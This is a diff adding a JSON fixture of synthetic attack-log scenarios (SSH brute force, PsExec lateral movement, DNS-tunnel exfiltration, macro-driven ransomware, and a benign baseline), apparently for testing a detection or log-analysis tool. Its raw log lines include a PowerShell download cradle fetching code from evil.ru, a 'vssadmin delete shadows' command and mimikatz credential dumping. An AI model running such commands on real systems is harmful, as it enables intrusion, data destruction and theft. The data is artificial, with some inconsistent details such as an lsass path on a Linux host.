@@ -1,0 +1,235 @@
+[
+  {
+    "scenario": "brute_force_ssh",
+    "description": "SSH brute force attack leading to successful login and privilege escalation",
+    "logs": [
+      {
+        "timestamp": "2024-01-15T03:22:11Z",
+        "action": "failed_login",
+        "user": "admin",
+        "source_ip": "185.220.101.5",
+        "target": "sshd",
+        "severity": "high",
+        "raw": "2024-01-15 03:22:11 Failed password for admin from 185.220.101.5 port 54231 ssh2"
+      },
+      {
+        "timestamp": "2024-01-15T03:22:14Z",
+        "action": "failed_login",
+        "user": "admin",
+        "source_ip": "185.220.101.5",
+        "target": "sshd",
+        "severity": "high",
+        "raw": "2024-01-15 03:22:14 Failed password for admin from 185.220.101.5 port 54234 ssh2"
+      },
+      {
+        "timestamp": "2024-01-15T03:22:17Z",
+        "action": "failed_login",
+        "user": "root",
+        "source_ip": "185.220.101.5",
+        "target": "sshd",
+        "severity": "high",
+        "raw": "2024-01-15 03:22:17 Failed password for root from 185.220.101.5 port 54237 ssh2"
+      },
+      {
+        "timestamp": "2024-01-15T03:22:31Z",
+        "action": "successful_login",
+        "user": "admin",
+        "source_ip": "185.220.101.5",
+        "target": "sshd",
+        "severity": "high",
+        "raw": "2024-01-15 03:22:31 Accepted password for admin from 185.220.101.5 port 54251 ssh2"
+      },
+      {
+        "timestamp": "2024-01-15T03:22:45Z",
+        "action": "sudo_execution",
+        "user": "admin",
+        "source_ip": "185.220.101.5",
+        "target": "/bin/bash",
+        "severity": "high",
+        "raw": "2024-01-15 03:22:45 sudo: admin : TTY=pts/0 ; PWD=/home/admin ; USER=root ; COMMAND=/bin/bash"
+      },
+      {
+        "timestamp": "2024-01-15T03:23:10Z",
+        "action": "credential_dump",
+        "user": "root",
+        "source_ip": "185.220.101.5",
+        "target": "/proc/lsass",
+        "severity": "high",
+        "raw": "2024-01-15 03:23:10 Suspicious process: mimikatz executed as root (hash: d38e2f6b...)"
+      }
+    ]
+  },
+  {
+    "scenario": "lateral_movement",
+    "description": "Lateral movement via PsExec with credential theft using Mimikatz",
+    "logs": [
+      {
+        "timestamp": "2024-01-15T09:14:03Z",
+        "action": "successful_login",
+        "user": "jsmith",
+        "hostname": "WORKSTATION-01",
+        "severity": "medium",
+        "raw": "2024-01-15 09:14:03 User jsmith authenticated to WORKSTATION-01 via NTLM"
+      },
+      {
+        "timestamp": "2024-01-15T09:14:45Z",
+        "action": "remote_exec",
+        "user": "jsmith",
+        "source_ip": "WORKSTATION-01",
+        "dest_ip": "FILESERVER-02",
+        "severity": "high",
+        "raw": "2024-01-15 09:14:45 PsExec executed on FILESERVER-02 from WORKSTATION-01 by jsmith"
+      },
+      {
+        "timestamp": "2024-01-15T09:15:20Z",
+        "action": "privilege_escalation",
+        "user": "jsmith",
+        "hostname": "FILESERVER-02",
+        "severity": "high",
+        "raw": "2024-01-15 09:15:20 cmd.exe launched as SYSTEM on FILESERVER-02 remotely"
+      },
+      {
+        "timestamp": "2024-01-15T09:16:05Z",
+        "action": "credential_dump",
+        "hostname": "FILESERVER-02",
+        "severity": "high",
+        "raw": "2024-01-15 09:16:05 Mimikatz process detected on FILESERVER-02 (hash: d38e2f6b...)"
+      },
+      {
+        "timestamp": "2024-01-15T09:17:10Z",
+        "action": "pass_the_hash",
+        "source_ip": "FILESERVER-02",
+        "dest_ip": "DC-01",
+        "severity": "high",
+        "raw": "2024-01-15 09:17:10 Pass-the-hash attempt to DC-01 from FILESERVER-02 using administrator hash"
+      }
+    ]
+  },
+  {
+    "scenario": "data_exfiltration",
+    "description": "Large-scale data exfiltration with DNS tunneling and HTTPS upload",
+    "logs": [
+      {
+        "timestamp": "2024-01-15T14:30:01Z",
+        "action": "data_transfer",
+        "source_ip": "192.168.1.105",
+        "dest_ip": "45.33.32.156",
+        "severity": "high",
+        "raw": "2024-01-15 14:30:01 Large file transfer initiated from 192.168.1.105 to 45.33.32.156"
+      },
+      {
+        "timestamp": "2024-01-15T14:30:15Z",
+        "action": "dns_tunnel",
+        "source_ip": "192.168.1.105",
+        "target": "suspicious.exfil-domain.ru",
+        "severity": "high",
+        "raw": "2024-01-15 14:30:15 DNS query storm: 192.168.1.105 querying suspicious.exfil-domain.ru"
+      },
+      {
+        "timestamp": "2024-01-15T14:32:10Z",
+        "action": "file_compression",
+        "source_ip": "192.168.1.105",
+        "target": "/var/data/customers/",
+        "severity": "high",
+        "raw": "2024-01-15 14:32:10 7zip compression of /var/data/customers/ detected on 192.168.1.105"
+      },
+      {
+        "timestamp": "2024-01-15T14:34:55Z",
+        "action": "dlp_alert",
+        "source_ip": "192.168.1.105",
+        "severity": "high",
+        "raw": "2024-01-15 14:34:55 DLP alert: PII data pattern matched in outbound traffic from 192.168.1.105"
+      }
+    ]
+  },
+  {
+    "scenario": "ransomware_deployment",
+    "description": "Ransomware via malicious macro execution with C2 and file encryption",
+    "logs": [
+      {
+        "timestamp": "2024-01-15T22:01:05Z",
+        "action": "macro_execution",
+        "target": "invoice_Q4.docm",
+        "hostname": "HOST-FINANCE-03",
+        "severity": "high",
+        "raw": "2024-01-15 22:01:05 Suspicious macro execution in Word document: invoice_Q4.docm"
+      },
+      {
+        "timestamp": "2024-01-15T22:01:10Z",
+        "action": "powershell_exec",
+        "hostname": "HOST-FINANCE-03",
+        "severity": "high",
+        "raw": "2024-01-15 22:01:10 PowerShell.exe spawned by WINWORD.EXE (parent PID 4832)"
+      },
+      {
+        "timestamp": "2024-01-15T22:01:15Z",
+        "action": "download_cradle",
+        "hostname": "HOST-FINANCE-03",
+        "target": "http://evil.ru/payload",
+        "severity": "high",
+        "raw": "2024-01-15 22:01:15 PowerShell download cradle: IEX(New-Object Net.WebClient).DownloadString('http://evil.ru/payload')"
+      },
+      {
+        "timestamp": "2024-01-15T22:01:22Z",
+        "action": "c2_beacon",
+        "source_ip": "HOST-FINANCE-03",
+        "dest_ip": "91.108.4.1",
+        "severity": "high",
+        "raw": "2024-01-15 22:01:22 C2 beacon established to 91.108.4.1:8080 from HOST-FINANCE-03"
+      },
+      {
+        "timestamp": "2024-01-15T22:02:00Z",
+        "action": "shadow_copy_delete",
+        "hostname": "HOST-FINANCE-03",
+        "severity": "high",
+        "raw": "2024-01-15 22:02:00 Volume Shadow Copy deletion: vssadmin delete shadows /all /quiet"
+      },
+      {
+        "timestamp": "2024-01-15T22:02:10Z",
+        "action": "file_encryption",
+        "hostname": "FILESERVER-01",
+        "target": "*.docx -> *.locked",
+        "severity": "high",
+        "raw": "2024-01-15 22:02:10 Mass file rename detected: .docx -> .locked on FILESERVER-01 shares"
+      }
+    ]
+  },
+  {
+    "scenario": "normal_activity",
+    "description": "Legitimate user activity baseline — no threats",
+    "logs": [
+      {
+        "timestamp": "2024-01-15T09:01:12Z",
+        "action": "successful_login",
+        "user": "alice",
+        "source_ip": "10.0.0.45",
+        "target": "sshd",
+        "severity": "low",
+        "raw": "2024-01-15 09:01:12 Accepted password for alice from 10.0.0.45 port 22"
+      },
+      {
+        "timestamp": "2024-01-15T09:05:33Z",
+        "action": "file_open",
+        "user": "alice",
+        "target": "/home/alice/reports/Q4_summary.xlsx",
+        "severity": "low",
+        "raw": "2024-01-15 09:05:33 File opened: /home/alice/reports/Q4_summary.xlsx"
+      },
+      {
+        "timestamp": "2024-01-15T09:25:44Z",
+        "action": "outbound_connection",
+        "source_ip": "10.0.0.45",
+        "dest_ip": "api.company.com",
+        "severity": "low",
+        "raw": "2024-01-15 09:25:44 Outbound HTTPS connection to api.company.com:443 from 10.0.0.45"
+      },
+      {
+        "timestamp": "2024-01-15T09:45:17Z",
+        "action": "session_close",
+        "user": "alice",
+        "severity": "low",
+        "raw": "2024-01-15 09:45:17 pam_unix(sshd:session): session closed for user alice"
+      }
+    ]
+  }
+]
